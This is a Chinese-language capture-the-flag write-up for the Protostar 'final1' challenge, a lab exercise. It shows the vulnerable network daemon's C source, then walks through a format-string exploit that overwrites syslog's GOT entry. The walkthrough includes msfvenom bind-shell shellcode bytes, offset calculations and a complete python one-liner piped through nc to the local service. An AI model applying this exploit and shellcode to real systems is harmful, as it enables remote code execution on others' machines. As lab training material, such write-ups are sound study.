# final1

## （一） 题目：

\#include "../common/common.c"

\#include &lt;syslog.h&gt;

\#define NAME "final1"

\#define UID 0

\#define GID 0

\#define PORT 2994

char username\[128\];

char hostname\[64\];

void logit\(char \*pw\)

{

```
    char buf\[512\];



    snprintf\(buf, sizeof\(buf\), "Login from %s as \[%s\] with password \[%s\]\n", hostname, username, pw\);



    syslog\(LOG\_USER\|LOG\_DEBUG, buf\);
```

}

void trim\(char \*str\)

{

```
    char \*q;



    q = strchr\(str, '\r'\);

    if\(q\) \*q = 0;

    q = strchr\(str, '\n'\);

    if\(q\) \*q = 0;
```

}

void parser\(\)

{

```
    char line\[128\];



    printf\("\[final1\] $ "\);



    while\(fgets\(line, sizeof\(line\)-1, stdin\)\) {

            trim\(line\);

            if\(strncmp\(line, "username ", 9\) == 0\) {

                    strcpy\(username, line+9\);

            } else if\(strncmp\(line, "login ", 6\) == 0\) {

                    if\(username\[0\] == 0\) {

                            printf\("invalid protocol\n"\);

                    } else {

                            logit\(line + 6\);

                            printf\("login failed\n"\);

                    }

            }

            printf\("\[final1\] $ "\);

    }
```

}

void getipport\(\)

{

```
    int l;

    struct sockaddr\_in sin;



    l = sizeof\(struct sockaddr\_in\);

    if\(getpeername\(0, &sin, &l\) == -1\) {

            err\(1, "you don't exist"\);

    }



    sprintf\(hostname, "%s:%d", inet\_ntoa\(sin.sin\_addr\), ntohs\(sin.sin\_port\)\);
```

}

int main\(int argc, char \*\*argv, char \*\*envp\)

{

```
    int fd;

    char \*username;



    /\* Run the process as a daemon \*/

    background\_process\(NAME, UID, GID\);



    /\* Wait for socket activity and return \*/

    fd = serve\_forever\(PORT\);



    /\* Set the client socket to STDIN, STDOUT, and STDERR \*/

    set\_io\(fd\);



    getipport\(\);

    parser\(\);
```

}

## （二）解题过程：

```
 分析源代码，本题的漏洞点不止一个。修改syslog()地址跳到shellcode的
```

1）定位一下漏洞触发的位置，格式字符串的漏洞点

![](/png/94.png)

查看 /var/log/syslog![](/png/93.png)发现在读栈的第15个位置处出现了AAAABBBB，所以修改python输入代码

python -c 'print "username aaaabbbb"+"%15$x"+"\nlogin b"' \| nc 127.0.0.1 2994

![](/png/95.png)

可见位置有所偏移。修改脚本

python -c 'print "username xaaaa"+"%15$x"+"\nlogin b"' \| nc 127.0.0.1 2994![](/png/96.png)修正了偏移。

2）查找syslog函数的地址

![](/png/97.png)

占位测试

![](/png/98.png)

此时查看syslog

![](/png/99.png)

3）准备换上syslog地址

![](/assets/101.png)查看系统日志

![](/assets/100.png)

没有报错。再进行二次Login,程序崩溃

![](/assets/103.png)查看日志记录，此时生成了segfault错误。

![](/assets/102.png)

接下来需要在username或login中插入shellcode，在找出shellcode在程序中的内存地址

用shellcode的地址替换掉syslog的地址就好。

4）获取shellcode ，生成shellcode,kali 环境下用msfvenom生成

root@fly:/\# msfvenom -p  linux/x86/shell\_bind\_tcp -f c

\[-\] No platform was selected, choosing Msf::Module::Platform::Linux from the payload

\[-\] No arch selected, selecting arch: x86 from the payload

No encoder or badchars specified, outputting raw payload

Payload size: 78 bytes

Final size of c file: 354 bytes

unsigned char buf\[\] =

"\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80"

"\x5b\x5e\x52\x68\x02\x00\x11\x5c\x6a\x10\x51\x50\x89\xe1\x6a"

"\x66\x58\xcd\x80\x89\x41\x04\xb3\x04\xb0\x66\xcd\x80\x43\xb0"

"\x66\xcd\x80\x93\x59\x6a\x3f\x58\xcd\x80\x49\x79\xf8\x68\x2f"

"\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0"

"\x0b\xcd\x80";

找到shellcode的地址在0xbffffa05位置，syslog的地址是0x0804a11c，前面程序报告位置是0x30303030，通过计算可得：

&gt;print 0x105-0x30

213

print 0xfa-0x05

245

print 0x1ff-0xfa

261

print 0x1bf-0xff

192

测试

好像因为添加了偏移量，shellcode的位置移动了一点，try again~

print 0x119-0x30

233

print 0xfa-0x19

225

print 0x1ff-0xfa

261

print 0x1bf-0xff

192

5）编写漏洞利用脚本：

python -c 'print "username x\x1c\xa1\x04\x08\x1d\xa1\x04\x08\x1e\xa1\x04\x08\x1f\xa1\x04\x08%233x%15$n%225x%16$n%261x%17$n%192x%18$n\nlogin b\nlogin "+"\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80\x5b\x5e\x52\x68\xff\x02\x11\x5c\x6a\x10\x51\x50\x89\xe1\x6a\x66\x58\xcd\x80\x89\x41\x04\xb3\x04\xb0\x66\xcd\x80\x43\xb0\x66\xcd\x80\x93\x59\x6a\x3f\x58\xcd\x80\x49\x79\xf8\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"' \| nc 127.0.0.1 2994



![](/assets/107.png)

ref:

[http://www.voidcn.com/article/p-owxcnsmw-xo.html](http://www.voidcn.com/article/p-owxcnsmw-xo.html)

